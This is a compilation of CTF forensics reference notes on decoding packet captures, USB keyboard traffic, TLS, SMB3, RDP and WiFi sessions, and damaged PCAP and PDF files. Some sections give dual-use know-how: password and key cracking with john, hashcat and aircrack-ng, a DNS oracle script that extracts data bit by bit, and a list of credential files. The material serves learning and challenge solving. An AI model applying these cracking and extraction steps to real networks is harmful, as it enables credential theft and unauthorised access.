**Key insight:** Protocol checksums constrain missing data. For single missing bytes, brute-force is instant. For multiple missing bytes, use TCP sequence numbers and MAC/IP header structure to reduce the search space.

---

## USB HID Keyboard Capture Decoding (EKOPARTY CTF 2016)

USB keyboard captures contain HID scan codes that map to keystrokes. Decode the capture to reconstruct typed text.

```python
# USB HID keyboard report format:
# Byte 0: Modifier keys (Shift, Ctrl, Alt)
# Byte 1: Reserved (0x00)
# Bytes 2-7: Up to 6 simultaneous key codes

# HID scan code to character mapping (partial)
HID_MAP = {
    0x04: 'a', 0x05: 'b', 0x06: 'c', 0x07: 'd', 0x08: 'e',
    0x09: 'f', 0x0a: 'g', 0x0b: 'h', 0x0c: 'i', 0x0d: 'j',
    0x0e: 'k', 0x0f: 'l', 0x10: 'm', 0x11: 'n', 0x12: 'o',
    0x13: 'p', 0x14: 'q', 0x15: 'r', 0x16: 's', 0x17: 't',
    0x18: 'u', 0x19: 'v', 0x1a: 'w', 0x1b: 'x', 0x1c: 'y',
    0x1d: 'z', 0x1e: '1', 0x1f: '2', 0x20: '3', 0x21: '4',
    0x22: '5', 0x23: '6', 0x24: '7', 0x25: '8', 0x26: '9',
    0x27: '0', 0x28: '\n', 0x2c: ' ', 0x2d: '-', 0x2e: '=',
    0x2f: '[', 0x30: ']', 0x33: ';', 0x34: "'", 0x36: ',',
    0x37: '.', 0x38: '/',
}

SHIFT_MAP = {
    'a': 'A', 'b': 'B', '1': '!', '2': '@', '3': '#', '4': '$',
    '5': '%', '6': '^', '7': '&', '8': '*', '9': '(', '0': ')',
    '-': '_', '=': '+', '[': '{', ']': '}', ';': ':', "'": '"',
    ',': '<', '.': '>', '/': '?',
}

def decode_hid_keyboard(capture_data):
    """Decode USB HID keyboard capture to text"""
    text = ""
    for report in capture_data:
        modifier = report[0]
        keycode = report[2]  # first key in report

        if keycode == 0:
            continue

        char = HID_MAP.get(keycode, '')
        if modifier & 0x22:  # Left or Right Shift
            char = SHIFT_MAP.get(char, char.upper())

        text += char
    return text

# Extract from Wireshark: tshark -r capture.pcapng -T fields -e usb.capdata
# Or from text dump: parse +XX/-XX format (+ = keydown, - = keyup)
```

**Key insight:** USB HID keyboards send 8-byte reports where byte 0 is modifiers (Shift/Ctrl/Alt) and bytes 2-7 are active key scan codes. In Wireshark, filter with `usb.transfer_type == 1` and extract `usb.capdata`. Ignore reports where byte 2 is 0x00 (key release).

---

## dnscat2 Traffic Reassembly from DNS PCAP (BSidesSF 2017)

**Pattern (dnscap):** Extract data tunneled via dnscat2 from a DNS pcap. Decode base32 subdomain labels from DNS queries, strip the 9-byte dnscat2 protocol header from each chunk, deduplicate retransmitted packets by comparing consecutive queries, then reassemble the payload (e.g., PNG image).

```python
from scapy.all import rdpcap, DNSQR

packets = rdpcap('capture.pcap')
domain = '.skullseclabs.org.'
prev = None
data = b''

for p in packets:
    if not p.haslayer(DNSQR):
        continue
    qname = p[DNSQR].qname.decode()
    if domain not in qname:
        continue
    # Strip domain, join hex-encoded labels
    labels = qname.replace(domain, '').split('.')
    chunk = bytes.fromhex(''.join(labels))
    chunk = chunk[9:]  # strip 9-byte dnscat2 header
    if chunk == prev:
        continue  # skip retransmission
    prev = chunk
    data += chunk

with open('extracted.png', 'wb') as f:
    f.write(data)
```

**Key insight:** dnscat2 encodes data in DNS query subdomain labels (hex or base32). Each query carries a 9-byte header (session ID, sequence, acknowledgment). Retransmissions are common — deduplicate by comparing consecutive payloads. The reassembled stream may contain files (PNG, documents) identifiable by magic bytes.

---

## USB Keyboard LED Morse Code Exfiltration (BITSCTF 2017)

**Pattern (Ghost in the Machine):** A pcap of USB keyboard traffic contains host-to-device packets with alternating `0x01`/`0x03` values controlling the Caps Lock LED state. Timing differences between LED state changes encode Morse code: durations >300ms represent dashes, shorter durations represent dots. Decode the Morse sequence to recover the flag.

```python
from scapy.all import rdpcap
import struct

packets = rdpcap('usb_capture.pcap')
signals = []

for p in packets:
    raw = bytes(p)
    # USB HID SET_REPORT to keyboard (host -> device)
    if len(raw) >= 35 and raw[30] in (0x01, 0x03):
        timestamp = p.time
        led_state = raw[30]  # 0x01 = LED off, 0x03 = LED on
        signals.append((timestamp, led_state))

# Convert timing to Morse
morse = ''
for i in range(0, len(signals) - 1, 2):
    duration = signals[i+1][0] - signals[i][0]
    if duration > 0.3:
        morse += '-'
    else:
        morse += '.'
    # Gap between signals indicates letter/word boundary
```

**Key insight:** Data exfiltration via keyboard LED state changes captured in USB pcap. The LED control packets use HID SET_REPORT class requests. Timing analysis of on/off transitions reveals Morse code patterns. Tools: Wireshark USB dissector, filter on `usb.transfer_type == 0x02` (interrupt) and direction host→device.

---

## Unreferenced PDF Objects with Hidden Pages (SharifCTF 7 2016)

**Pattern (Strange PDF):** A PDF contains objects not referenced by the page tree. To reveal hidden content: (1) examine raw PDF objects with `qpdf --show-xref` or a text editor, (2) identify unreferenced content stream objects, (3) modify the `/Kids` array in the Pages object to include hidden page references, (4) increment the `/Count` value, (5) re-render the PDF to display previously hidden pages containing flag data.

```bash
# List all objects in the PDF
qpdf --show-xref suspicious.pdf

# Find pages object and hidden content objects
strings suspicious.pdf | grep -E '/Type /Page|/Contents|/Kids'

# Manual fix: edit PDF to add hidden page references
# Change: /Kids [1 0 R]  ->  /Kids [1 0 R 5 0 R]
# Change: /Count 1  ->  /Count 2
# Rewrite xref table or use qpdf --linearize to fix offsets
qpdf --linearize modified.pdf fixed.pdf
```

**Key insight:** PDF viewers only render pages reachable from the `/Pages` tree root. Unreferenced objects are invisible but still present in the file. Check object cross-references: any content stream object not in `/Kids` may contain hidden data. `mutool clean -d` and `qpdf --show-object N` help inspect individual objects.

---

## RDP Session Decryption via Extracted PKCS12 Key (HITB 2017)

PCAP contains a PKCS12 (.p12/.pfx) file transmitted over UDP. Extract the private key from the PKCS12 container, then load it into Wireshark to decrypt the RDP session and recover transmitted data.

```bash
# Extract private key from PKCS12 (no cert, no passphrase protection)
openssl pkcs12 -in cert.p12 -out key.pem -nocerts -nodes

# In Wireshark: Edit > Preferences > Protocols > TLS > RSA keys list
# Add entry: IP=<rdp_server_ip>, Port=3389, Protocol=tpkt, Key file=key.pem
```

**Key insight:** PKCS12 files in network captures provide the private key needed to decrypt encrypted RDP sessions in Wireshark. Look for .p12/.pfx file transfers (often in UDP or FTP streams) before the RDP session begins.

---

## USB HID Keyboard Arrow Key Navigation Tracking (HackIT 2017)

USB HID keyboard traffic from an Apple Keyboard requires tracking arrow key navigation. Decode HID keycodes using the USB HID usage table. Modifier byte `0x02` = Shift (uppercase). Track cursor position via up/down arrow presses to determine which line contains the flag.

```bash
tshark -r capture.pcap -T fields -e usb.capdata | \
  python3 decode_hid.py  # Must track arrow keys for line position
```

Arrow key HID codes to track:
- `0x4F` = Right Arrow
- `0x50` = Left Arrow
- `0x51` = Down Arrow (next line)
- `0x52` = Up Arrow (previous line)

```python
# Skeleton: track line position during HID decode
line = 0
lines = {0: ""}
for report in hid_reports:
    modifier = report[0]
    keycode = report[2]
    if keycode == 0x51:    # Down arrow
        line += 1; lines.setdefault(line, "")
    elif keycode == 0x52:  # Up arrow
        line -= 1; lines.setdefault(line, "")
    elif keycode in HID_MAP:
        char = HID_MAP[keycode]
        if modifier & 0x22:
            char = char.upper()
        lines[line] += char
# Flag is on a specific line determined by arrow navigation
```

**Key insight:** USB keyboard captures must account for cursor movement keys (arrows, backspace). Track cursor line position to reconstruct text typed on each line separately — the flag may be on a non-zero line that arrow keys navigated to.

---

## RADIUS Shared Secret Cracking (UConn CyberSEED 2017)

Extract the RADIUS authenticator hash from a PCAP using `radius2john.pl`, crack the shared secret with john, then enter the cracked secret in Wireshark to decrypt obfuscated password fields.

```bash
# Extract hash for john
perl radius2john.pl capture.pcap > radius_hash.txt
john radius_hash.txt --wordlist=rockyou.txt

# Wireshark: Edit > Preferences > Protocols > RADIUS > Shared Secret = <cracked_secret>
# RADIUS Access-Request packets will now show decrypted User-Password fields
```

`radius2john.pl` is part of the JohnTheRipper jumbo package (`src/radius2john.pl`).

**Key insight:** RADIUS uses MD5(shared_secret + authenticator + password) for password obfuscation — cracking the shared secret via john exposes all credentials in the capture. The shared secret is typically a short dictionary word.

---

## RC4 Stream Identification in Shellcode PCAP (CODE BLUE 2017)

A backdoor sends 32 bytes of `/dev/urandom` as an RC4 key, then encrypts all subsequent traffic. Identify RC4 by the characteristic 256-byte KSA (Key Scheduling Algorithm) table initialization pattern visible in the shellcode. Extract the key from the first 32 bytes of the TCP stream and decrypt the remainder.

```python
from scapy.all import rdpcap, TCP

packets = rdpcap('capture.pcap')
stream = b''
for pkt in packets:
    if TCP in pkt and pkt[TCP].payload:
        stream += bytes(pkt[TCP].payload)

# First 32 bytes = RC4 key (from /dev/urandom)
key = stream[:32]
ciphertext = stream[32:]

# RC4 decryption
def rc4(key, data):
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) % 256
        S[i], S[j] = S[j], S[i]
    i = j = 0
    out = []
    for byte in data:
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        S[i], S[j] = S[j], S[i]
        out.append(byte ^ S[(S[i] + S[j]) % 256])
    return bytes(out)

plaintext = rc4(key, ciphertext)
```

**Key insight:** RC4 in shellcode is identifiable by the 256-byte permutation table initialization loop (KSA). The key is typically the first N bytes transmitted over the connection before encrypted data begins. Look for a fixed-length initial burst followed by encrypted traffic.

---

See also: [network.md](network.md) for basic network forensics techniques (tcpdump, TLS/SSL decryption, Wireshark, port scanning, SMB3 decryption, credential extraction, 5G protocols).


# network

# CTF Forensics - Network

## Table of Contents
- [tcpdump Quick Reference](#tcpdump-quick-reference)
- [TLS/SSL Decryption via Keylog File](#tlsssl-decryption-via-keylog-file)
- [Wireshark Basics](#wireshark-basics)
- [Port Scan Analysis](#port-scan-analysis)
- [Gateway/Device via MAC OUI](#gatewaydevice-via-mac-oui)
- [WordPress Reconnaissance](#wordpress-reconnaissance)
- [Post-Exploitation Traffic](#post-exploitation-traffic)
- [Credential Extraction](#credential-extraction)
- [SMB3 Encrypted Traffic](#smb3-encrypted-traffic)
- [5G/NR Protocol Analysis](#5gnr-protocol-analysis)
- [Email Headers](#email-headers)
- [USB HID Stenography/Chord PCAP (UTCTF 2024)](#usb-hid-stenographychord-pcap-utctf-2024)
- [BCD Encoding in UDP (VuwCTF 2025)](#bcd-encoding-in-udp-vuwctf-2025)
- [HTTP File Upload Exfiltration in PCAP (MetaCTF 2026)](#http-file-upload-exfiltration-in-pcap-metactf-2026)
- [TLS Master Key Extraction from Coredump (PlaidCTF 2014)](#tls-master-key-extraction-from-coredump-plaidctf-2014)
- [Split Archive Reassembly from HTTP Transfers (ASIS CTF Finals 2013)](#split-archive-reassembly-from-http-transfers-asis-ctf-finals-2013)
- [WPA/WEP WiFi Decryption from PCAP (DefCamp CTF 2016)](#wpawep-wifi-decryption-from-pcap-defcamp-ctf-2016)
- [Corrupted PCAP Repair with pcapfix (CSAW CTF 2016)](#corrupted-pcap-repair-with-pcapfix-csaw-ctf-2016)
- [SAP Dialog Protocol Decryption from PCAP (GreHack CTF 2016)](#sap-dialog-protocol-decryption-from-pcap-grehack-ctf-2016)
- [DNS Exfiltration Oracle via Binary Response Probing (ASIS CTF Finals 2017)](#dns-exfiltration-oracle-via-binary-response-probing-asis-ctf-finals-2017)

---

## tcpdump Quick Reference

Command-line packet capture tool for quick network forensics triage.

```bash
# Basic capture on interface
sudo tcpdump -i eth0

# Capture to file
sudo tcpdump -i eth0 -w capture.pcap

# Filter by source IP
sudo tcpdump -i eth0 src 192.168.1.100

# Filter by destination port
sudo tcpdump -i eth0 dst port 80

# Combined filter with file output
sudo tcpdump -i eth0 -w packets.pcap 'src 172.22.206.250 and port 443'

# Read from file with verbose output
tcpdump -r capture.pcap -v

# Show packet contents in ASCII
tcpdump -r capture.pcap -A

# Show hex + ASCII dump
tcpdump -r capture.pcap -X

# Count total packets
tcpdump -r capture.pcap -q | wc -l
```

**Common filters:**
| Filter | Description |
|--------|-------------|
| `host 10.0.0.1` | Traffic to/from IP |
| `net 192.168.1.0/24` | Entire subnet |
| `port 80` | HTTP traffic |
| `tcp` / `udp` / `icmp` | Protocol filter |
| `src host X and dst port Y` | Combined |

**Key insight:** Use tcpdump for quick command-line triage when Wireshark is unavailable. Pipe to `strings` or `grep` for fast flag hunting: `tcpdump -r capture.pcap -A | grep -i flag`.

---

## TLS/SSL Decryption via Keylog File

To decrypt TLS traffic in Wireshark, provide either the pre-master secret or a keylog file.

**Method 1 — SSLKEYLOGFILE (client-side key logging):**

If the challenge provides a keylog file (or you can set `SSLKEYLOGFILE`):
```bash
# Set environment variable before running the client
export SSLKEYLOGFILE=/tmp/sslkeys.log
curl https://target/secret

# Import into Wireshark:
# Edit → Preferences → Protocols → TLS → (Pre)-Master-Secret log filename → /tmp/sslkeys.log
```

**Keylog file format (NSS Key Log Format):**
```text
CLIENT_RANDOM <32_bytes_client_random_hex> <48_bytes_master_secret_hex>
```

**Method 2 — RSA private key (if server key is known):**

**Note:** Only works with RSA key exchange. Sessions using forward secrecy (ECDHE/DHE cipher suites) cannot be decrypted with the server's private key — use Method 1 instead. CTF challenges with weak RSA keys typically use RSA key exchange.

```bash
# Wireshark: Edit → Preferences → Protocols → TLS → RSA keys list
# IP: 127.0.0.1, Port: 443, Protocol: http, Key File: server.key

# Or via tshark:
tshark -r capture.pcap -o "tls.keys_list:127.0.0.1,443,http,server.key" -Y http
```

**Method 3 — Weak RSA key factoring (see also linux-forensics.md):**
```bash
# Extract certificate from PCAP
tshark -r capture.pcap -Y "tls.handshake.type==11" -T fields -e tls.handshake.certificate | head -1

# Factor weak modulus, generate private key with rsatool
python rsatool.py -p <p> -q <q> -e 65537 -o server.key

# Import key into Wireshark
```

**SSL handshake components needed for decryption:**
1. `client_random` — sent in ClientHello
2. `server_random` — sent in ServerHello
3. Pre-master secret (PMS) — encrypted in ClientKeyExchange with server's RSA public key

**Key insight:** Look for keylog files (`.log`, `sslkeys.txt`) in challenge artifacts. If the challenge gives you a private key, use it directly. For weak RSA keys in certificates, factor the modulus to derive the private key.

---

## Wireshark Basics

```bash
# Filters
http.request.method == "POST"
tcp.stream eq 5
frame contains "flag"

# Export files
File → Export Objects → HTTP

# tshark
tshark -r capture.pcap -Y "http" -T fields -e http.file_data
tshark -r capture.pcap --export-objects http,/tmp/http_objects
```

---

## Port Scan Analysis

```bash
# IP conversation statistics
tshark -r capture.pcap -q -z conv,ip

# Find open ports (SYN-ACK responses)
tshark -r capture.pcap -Y "tcp.flags.syn==1 && tcp.flags.ack==1" \
  -T fields -e ip.src -e tcp.srcport | sort -u
```

---

## Gateway/Device via MAC OUI

```bash
# Extract MAC addresses
tshark -r capture.pcap -Y "arp" -T fields \
  -e arp.src.hw_mac -e arp.src.proto_ipv4 | sort -u

# Vendor lookup
curl -s "https://macvendors.com/query/88:bd:09"
```

---

## WordPress Reconnaissance

**Identify WPScan:**
```bash
tshark -r capture.pcap -Y "http.user_agent contains \"WPScan\"" | head -1
```

**WordPress version:**
```bash
cat /tmp/http_objects/feed* | grep -i generator
```

**Plugins:**
```bash
tshark -r capture.pcap \
  -Y "http.response.code == 200 && http.request.uri contains \"wp-content/plugins\"" \
  -T fields -e http.request.uri | sort -u
```

**Usernames (REST API):**
```bash
cat /tmp/http_objects/*per_page* | jq '.[].name'
```

---

## Post-Exploitation Traffic

**Step 1: TCP conversations**
```bash
tshark -r capture.pcap -q -z conv,tcp
```

**Step 2: Established connections (SYN-ACK)**
```bash
tshark -r capture.pcap -Y "tcp.flags.syn == 1 and tcp.flags.ack == 1" \
  -T fields -e ip.src -e ip.dst -e tcp.srcport -e tcp.dstport | sort -u
```

**Step 3: Follow TCP stream**
```bash
tshark -r capture.pcap -q -z "follow,tcp,ascii,<stream_number>"
```

**Reverse shell indicators:**
- `bash: cannot set terminal process group`
- `bash: no job control in this shell`
- Shell prompts like `www-data@hostname:/path$`

---

## Credential Extraction

**High-value files:**
| Application | File | Format |
|-------------|------|--------|
| WordPress | `wp-config.php` | `define('DB_PASSWORD', '...')` |
| Laravel | `.env` | `DB_PASSWORD=` |
| MySQL | `/etc/mysql/debian.cnf` | `password = ` |

```bash
# Search shell stream for credentials
tshark -r capture.pcap -q -z "follow,tcp,ascii,<stream>" | grep -i "password"
```

---

## SMB3 Encrypted Traffic

**Step 1: Extract NTLMv2 hash**
```bash
tshark -r capture.pcap -Y "ntlmssp.messagetype == 0x00000003" -T fields \
  -e ntlmssp.ntlmv2_response.ntproofstr \
  -e ntlmssp.auth.username
```

**Step 2: Crack with hashcat**
```bash
hashcat -m 5600 ntlmv2_hash.txt wordlist.txt
```

**Step 3: Derive SMB 3.1.1 session keys (Python)**
```python
from Cryptodome.Cipher import AES, ARC4
from Cryptodome.Hash import MD4
import hmac, hashlib

def SP800_108_Counter_KDF(Ki, Label, Context, L):
    n = (L // 256) + 1
    result = b''
    for i in range(1, n + 1):
        data = i.to_bytes(4, 'big') + Label + b'\x00' + Context + L.to_bytes(4, 'big')
        result += hmac.new(Ki, data, hashlib.sha256).digest()
    return result[:L // 8]

# Compute session key
nt_hash = MD4.new(password.encode('utf-16le')).digest()
response_key = hmac.new(nt_hash, (user.upper() + domain.upper()).encode('utf-16le'), hashlib.md5).digest()
key_exchange_key = hmac.new(response_key, ntproofstr, hashlib.md5).digest()
session_key = ARC4.new(key_exchange_key).encrypt(encrypted_session_key)

# Derive encryption keys
c2s_key = SP800_108_Counter_KDF(session_key, b"SMBC2SCipherKey\x00", preauth_hash, 128)
s2c_key = SP800_108_Counter_KDF(session_key, b"SMBS2CCipherKey\x00", preauth_hash, 128)
```

**Step 4: Decrypt (AES-128-GCM)**
```python
def decrypt_smb311(transform_data, key):
    signature = transform_data[4:20]
    nonce = transform_data[20:32]
    aad = transform_data[20:52]
    encrypted = transform_data[52:]

    cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
    cipher.update(aad)
    return cipher.decrypt_and_verify(encrypted, signature)
```

---

## 5G/NR Protocol Analysis

**Wireshark setup:**
- Enable: NAS-5GS, RLC-NR, PDCP-NR, MAC-NR

**SMS in 5G (3GPP TS 23.040):**

| IEI | Format |
|-----|--------|
| 0x0c | iMelody (ringtone) |
| 0x0e | Large Animation (16×16) |
| 0x18 | WVG (vector graphics) |

**iMelody to Morse:**
- Notes like `c4c4c4r2` encode dots/dashes

---

## Email Headers

- Check routing information
- Look for encoded attachments (base64)
- MIME boundaries may hide data

---

## USB HID Stenography/Chord PCAP (UTCTF 2024)

**Pattern (Gibberish):** USB keyboard PCAP with simultaneous multi-key presses = stenography chording.

**Detection:** Multiple simultaneous USB HID keys (6+ at once) in interrupt transfers. Not regular typing.

**Decoding workflow:**
1. Extract HID reports from PCAP
2. Detect simultaneous key states (multiple keycodes in same report)
3. Map chords to Plover stenography dictionary
4. Install Plover, use its dictionary for translation

```bash
# Extract USB HID data
tshark -r capture.pcap -Y "usb.transfer_type == 1" -T fields -e usb.capdata
```

---

## BCD Encoding in UDP (VuwCTF 2025)

**Pattern (1.5x-engineer):** "1.5x" hints at the encoding ratio.

**BCD (Binary-Coded Decimal):** Each nibble (4 bits) encodes one decimal digit (0-9). Two digits per byte vs one ASCII digit per byte → BCD is 2x denser than ASCII decimal. The "1.5x" name refers to the challenge-specific framing: 3 BCD bytes encode 6 digits which represent 2 ASCII bytes (3:2 ratio).

**Decoding:**
```python
def bcd_decode(data):
    result = ''
    for byte in data:
        high = (byte >> 4) & 0x0F
        low = byte & 0x0F
        result += f'{high}{low}'
    return result

# UDP sessions differentiated by first byte
# Session 1 = BCD-encoded ASCII metadata with flag
# Session 2 = encrypted DOCX
```

**Lesson:** Challenge name often hints at encoding ratio or technique.

---

## HTTP File Upload Exfiltration in PCAP (MetaCTF 2026)

**Pattern (Dead Drop):** Small PCAP with TCP streams containing HTTP traffic. Exfiltrated data uploaded as a file via multipart form POST.

**Quick triage:**
```bash
# Count packets and protocols
tshark -r capture.pcap -q -z io,phs

# List HTTP requests
tshark -r capture.pcap -Y "http.request" -T fields -e http.request.method -e http.request.uri -e http.host

# Export all HTTP objects (files transferred)
tshark -r capture.pcap --export-objects http,/tmp/http_objects
ls -la /tmp/http_objects/

# Follow specific TCP streams
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"
tshark -r capture.pcap -q -z "follow,tcp,ascii,1"
```

**Extraction workflow:**
1. Export HTTP objects — uploaded files are extracted automatically
2. Check for multipart form-data POST requests (file uploads)
3. Look for unusual User-Agent strings (e.g., `DeadDropBot/1.0`) indicating automated exfiltration
4. Extracted files may be images (PNG/JPEG) with flag text rendered visually — open and inspect

**Key indicators of exfiltration:**
- POST to `/upload` endpoints
- Non-standard User-Agent strings
- Small number of packets but containing file transfers
- "Dead drop" pattern: attacker uploads file to web server for later retrieval

**Lesson:** Always start with `--export-objects` to extract transferred files before deep packet analysis. The flag is often in the exfiltrated file itself.

---

## TLS Master Key Extraction from Coredump (PlaidCTF 2014)

**Pattern:** Given a PCAP with HTTPS traffic and a coredump from the server/client process, extract the TLS master key from OpenSSL's in-memory session structure to decrypt the traffic.

**Extraction workflow:**

1. Find the TLS Session ID from the handshake in Wireshark (visible in plaintext in the ClientHello/ServerHello)
2. Search the coredump for the session ID bytes:
```bash
# Search for session ID in coredump
grep -c '\x19\xAB\x5E\xDC\x02\xF0\x97\xD5' corefile
hexdump -C corefile | grep --before=5 '19 ab 5e dc'
```

3. In OpenSSL's `ssl_session_st`, `master_key[48]` is stored immediately before `session_id[32]`. Read the 48 bytes before the session ID match.

4. Create a Wireshark pre-master-secret log file:
```text
RSA Session-ID:<hex_session_id> Master-Key:<hex_master_key>
```

5. Load in Wireshark: Edit → Preferences → Protocols → TLS → (Pre-)Master-Secret log filename

**Key insight:** OpenSSL stores `master_key[48]` directly before `session_id[32]` in `ssl_session_st`. Search the coredump for the session ID (from the TLS handshake), then read the 48 bytes before it. This works with coredumps, memory dumps, and Volatility memory extractions.

---

## Split Archive Reassembly from HTTP Transfers (ASIS CTF Finals 2013)

**Pattern:** PCAP contains multiple HTTP file transfers with MD5-hash filenames, all the same size except one smaller file. Files are fragments of a split archive (e.g., 7z) that must be reassembled in order. A separate TCP stream contains a chat conversation with the archive password.

**Identification:**
- Multiple HTTP-transferred files with uniform size (e.g., 61440 bytes) and one smaller trailing fragment
- First file has an archive magic number (e.g., `7z` header `37 7A BC AF 27 1C`)
- Cover traffic and multiple ports used to obscure the transfers
- Apache directory listing in PCAP provides file modification timestamps

**Reassembly workflow:**

1. Extract all HTTP objects and identify fragments:
```bash
# Export HTTP objects
tshark -r capture.pcap --export-objects http,/tmp/http_objects
ls -la /tmp/http_objects/

# Check first file for archive magic number
xxd /tmp/http_objects/d33cf9e6230f3b8e5a0c91a0514ab476 | head -1
# 00000000: 377a bcaf 271c ...  → 7z archive header
```

2. Determine fragment order from Apache directory listing timestamps in PCAP:
```bash
# Extract the directory listing page
tshark -r capture.pcap -Y "http.response and http.content_type contains html" \
  -T fields -e http.file_data | head -1
# Parse modification timestamps from the HTML table, sort chronologically
```

3. Concatenate fragments in timestamp order:
```bash
# Order files by modification timestamp (earliest first, smallest file last)
cat d33cf9e6230f3b8e5a0c91a0514ab476 \
    57f18f111f47eb9f7b5cdf5bd45144b0 \
    1e13be50f05092e2a4e79b321c8450d4 \
    ... \
    c68cc0718b8b85e62c8a671f7c81e80a > archive.7z
```

4. Extract password from TCP conversation stream:
```bash
# Follow TCP streams to find chat with key exchange
tshark -r capture.pcap -q -z "follow,tcp,ascii,0"
# Look for "secret key" / "part N" messages, concatenate all parts
```

5. Decompress with recovered password:
```bash
7z x archive.7z -p"M)m5s6S^[>@#Q3+10PD.KE#cyPsvqH"
```

**Key insight:** When PCAP contains many same-sized file transfers, suspect a split archive. The fragment order is not the download order — look for an Apache/nginx directory listing page in the PCAP whose modification timestamps provide the correct reassembly sequence. The smallest file is the trailing fragment.

---

## WPA/WEP WiFi Decryption from PCAP (DefCamp CTF 2016)

Captured WiFi traffic in pcapng format can be decrypted if the WEP/WPA key is recovered through brute force or is known.

```bash
# Step 1: Identify encrypted WiFi networks in capture
aircrack-ng capture.pcapng

# Step 2: Crack WEP key (PTW attack or brute force)
aircrack-ng -a 1 capture.pcapng                    # PTW attack (fast)
aircrack-ng -a 1 -w wordlist.txt capture.pcapng     # dictionary attack

# Step 3: Crack WPA/WPA2 key
aircrack-ng -a 2 -w rockyou.txt capture.pcapng

# Step 4: Decrypt traffic with recovered key
airdecap-ng -w "recovered_key" capture.pcapng       # WEP
airdecap-ng -p "passphrase" -e "SSID" capture.pcapng # WPA

# Step 5: Analyze decrypted traffic
# Output: capture-dec.pcapng (decrypted packets)
wireshark capture-dec.pcapng

# Alternative: decrypt directly in Wireshark
# Edit > Preferences > Protocols > IEEE 802.11
# Add decryption key (WEP/WPA-PWD/WPA-PSK)

# Look for: HTTP traffic, IPP (printing), FTP, unencrypted protocols
# Multiple password changes may require multiple decryption passes
```

**Key insight:** WiFi CTF challenges often have multiple encryption key changes throughout the capture. Decrypt, look for hints to the next password in the decrypted traffic, then decrypt the next segment. Check Internet Printing Protocol (IPP) streams for job-name fields containing flags.

---

## Corrupted PCAP Repair with pcapfix (CSAW CTF 2016)

Corrupted packet capture files can be repaired to make them openable in Wireshark.

```bash
# Install pcapfix
# apt install pcapfix  (or brew install pcapfix)

# Repair corrupted pcap/pcapng file
pcapfix -d corrupted.pcap        # basic repair with verbose output
pcapfix -d corrupted.pcapng      # also handles pcapng format

# Output: fixed_corrupted.pcap (repaired file)

# Common corruption types pcapfix handles:
# - Broken file header (magic bytes)
# - Truncated packets
# - Invalid packet lengths
# - Missing packet headers
# - Wrong byte order
# - Damaged section headers (pcapng)

# If pcapfix fails, try manual repair:
python3 -c "
import struct
with open('corrupted.pcap', 'rb') as f:
    data = bytearray(f.read())

# Fix pcap magic bytes (0xa1b2c3d4 for microsecond, 0xa1b23c4d for nanosecond)
data[0:4] = struct.pack('<I', 0xa1b2c3d4)

# Fix version (2.4)
data[4:6] = struct.pack('<H', 2)
data[6:8] = struct.pack('<H', 4)

with open('fixed.pcap', 'wb') as f:
    f.write(data)
"

# Then open in Wireshark
wireshark fixed_corrupted.pcap
```

**Key insight:** Damaged PCAPs are common in forensics CTF challenges. Always try `pcapfix` first -- it handles most corruption automatically. For manual repair, the pcap header is 24 bytes: magic(4) + version(4) + timezone(4) + sigfigs(4) + snaplen(4) + linktype(4).

---

## SAP Dialog Protocol Decryption from PCAP (GreHack CTF 2016)

SAP Dialog frames in network captures can be decrypted using Cain and Abel on Windows.

```bash
# SAP Dialog protocol uses weak obfuscation (not true encryption)
# Step 1: Open PCAP in Wireshark to identify SAP traffic
# Filter: sap or tcp.port == 3200

# Step 2: Use Cain and Abel (Windows tool) for decryption
# - Import PCAP into Cain's Sniffer tab
# - Select SAP Dialog entries
# - Right-click > View to decrypt frames
# - Search with Ctrl+F for keywords (flag, key, password)

# Alternative: Use SAP Dissector plugin for Wireshark
# - Install: apt install wireshark-plugin-sap (if available)
# - Or: https://github.com/SecureAuthCorp/SAP-Dissection-plug-in-for-Wireshark

# Manual approach using pysap:
# pip install pysap
from pysap import SAPDiag
# Parse SAP Dialog packets from PCAP
```

**Key insight:** SAP Dialog protocol's "encryption" is simple obfuscation easily reversed. Cain and Abel (Windows) has built-in SAP Dialog decryption. For Linux, use pysap or SAP Wireshark dissector plugins.

---

---

## DNS Exfiltration Oracle via Binary Response Probing (ASIS CTF Finals 2017)

DNS queries to subdomains with binary string prefixes act as an oracle: the server returns NOERROR when the prefix matches the flag bits, NXDOMAIN otherwise. Build the binary string incrementally — add one bit at a time and test which value yields NOERROR — to reconstruct the flag bit by bit.

```python
import dns.resolver

flag_bits = ""
flag_len = 40  # adjust based on expected flag length in chars

for i in range(flag_len * 8):
    for bit in ['0', '1']:
        try:
            dns.resolver.resolve(f"{flag_bits}{bit}.target.com", 'A')
            flag_bits += bit
            break
        except dns.resolver.NXDOMAIN:
            continue

# Convert bit string to ASCII
flag = ''.join(chr(int(flag_bits[i:i+8], 2)) for i in range(0, len(flag_bits), 8))
print(flag)
```

**Key insight:** DNS NOERROR vs NXDOMAIN acts as a binary oracle leaking one bit per query — applicable to any DNS-based covert channel. Each query tests whether a candidate prefix is correct, allowing O(n) reconstruction where n is the number of bits in the flag.

See also: [network-advanced.md](network-advanced.md) for advanced network forensics techniques (packet interval timing encoding, USB HID mouse/pen drawing recovery, NTLMv2 hash cracking, TCP flag covert channels, DNS steganography, multi-layer PCAP with XOR, Brotli decompression bomb seam analysis, SMB RID recycling, Timeroasting MS-SNTP).


# signals-and-hardware

# CTF Forensics - Signals and Hardware

## Table of Contents
- [VGA Signal Decoding](#vga-signal-decoding)
- [HDMI TMDS Decoding](#hdmi-tmds-decoding)
- [DisplayPort 8b/10b + LFSR Decoding](#displayport-8b10b--lfsr-decoding)
- [Voyager Golden Record Audio (0xFun 2026)](#voyager-golden-record-audio-0xfun-2026)
- [Side-Channel Power Analysis (EHAX 2026)](#side-channel-power-analysis-ehax-2026)
- [Saleae Logic 2 UART Decode (EHAX 2026)](#saleae-logic-2-uart-decode-ehax-2026)
- [Flipper Zero .sub File (0xFun 2026)](#flipper-zero-sub-file-0xfun-2026)
- [Keyboard Acoustic Side-Channel (ApoorvCTF 2026)](#keyboard-acoustic-side-channel-apoorvctf-2026)
- [CD Audio Disc Image Steganography (BSidesSF 2026)](#cd-audio-disc-image-steganography-bsidessf-2026)
- [Linux input_event Keylogger Dump Parsing (Pwn2Win 2016)](#linux-input_event-keylogger-dump-parsing-pwn2win-2016)
- [I2C Bus Protocol Decoding (EKOPARTY CTF 2016)](#i2c-bus-protocol-decoding-ekoparty-ctf-2016)
